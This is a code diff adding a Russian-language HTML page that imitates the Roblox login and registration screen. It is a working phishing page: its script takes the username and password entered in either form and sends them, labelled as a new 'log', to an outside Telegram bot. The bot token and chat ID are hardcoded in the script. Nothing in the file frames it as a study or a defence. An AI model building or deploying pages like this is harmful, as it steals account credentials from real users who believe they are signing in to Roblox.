@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+        body { background-color: #121212; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { width: 100%; max-width: 400px; padding: 40px; background: #1f1f1f; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        h2 { text-align: center; margin-bottom: 24px; font-size: 24px; font-weight: 600; }
+        .tab-switch { display: flex; justify-content: center; margin-bottom: 24px; border-bottom: 2px solid #2f2f2f; }
+        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #787878; font-weight: 600; }
+        .tab.active { color: #ffffff; border-bottom: 2px solid #00b06f; }
+        .form-group { margin-bottom: 16px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #b0b0b0; }
+        input { width: 100%; padding: 12px; background: #2f2f2f; border: 1px solid #3f3f3f; border-radius: 4px; color: #ffffff; font-size: 16px; outline: none; }
+        input:focus { border-color: #00b06f; }
+        button { width: 100%; padding: 12px; background: #00b06f; border: none; border-radius: 4px; color: #ffffff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #00985f; }
+        .form-section { display: none; }
+        .form-section.active { display: block; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2 id="title">Вход в Roblox</h2>
+    
+    <div class="tab-switch">
+        <div class="tab active" onclick="switchTab('login')">Вход</div>
+        <div class="tab" onclick="switchTab('register')">Регистрация</div>
+    </div>
+
+    <div id="login-form" class="form-section active">
+        <div class="form-group">
+            <label>Имя пользователя / Эл. почта</label>
+            <input type="text" id="login-user" required>
+        </div>
+        <div class="form-group">
+            <label>Пароль</label>
+            <input type="password" id="login-pass" required>
+        </div>
+        <button onclick="sendData('Вход')">Войти</button>
+    </div>
+
+    <div id="register-form" class="form-section">
+        <div class="form-group">
+            <label>Имя пользователя</label>
+            <input type="text" id="reg-user" required>
+        </div>
+        <div class="form-group">
+            <label>Пароль</label>
+            <input type="password" id="reg-pass" required>
+        </div>
+        <button onclick="sendData('Регистрация')">Зарегистрироваться</button>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "8649629197:AAGLMs9-jWOUC1Jpp_lEUKuzG09_aN2B0Is";
+    const CHAT_ID = "8222285191";
+
+    function switchTab(tab) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.form-section').forEach(f => f.classList.remove('active'));
+        
+        if(tab === 'login') {
+            document.querySelectorAll('.tab')[0].classList.add('active');
+            document.getElementById('login-form').classList.add('active');
+            document.getElementById('title').innerText = 'Вход в Roblox';
+        } else {
+            document.querySelectorAll('.tab')[1].classList.add('active');
+            document.getElementById('register-form').classList.add('active');
+            document.getElementById('title').innerText = 'Регистрация в Roblox';
+        }
+    }
+
+    function sendData(type) {
+        let user, pass;
+        if(type === 'Вход') {
+            user = document.getElementById('login-user').value;
+            pass = document.getElementById('login-pass').value;
+        } else {
+            user = document.getElementById('reg-user').value;
+            pass = document.getElementById('reg-pass').value;
+        }
+
+        if(!user || !pass) return;
+
+        let message = `Новый лог (${type})\nЛогин: ${user}\nПароль: ${pass}`;
+
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", `https://api.telegram.org/bot${TOKEN}/sendMessage`, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: message }));
+    }
+</script>
+
+</body>
+</html>
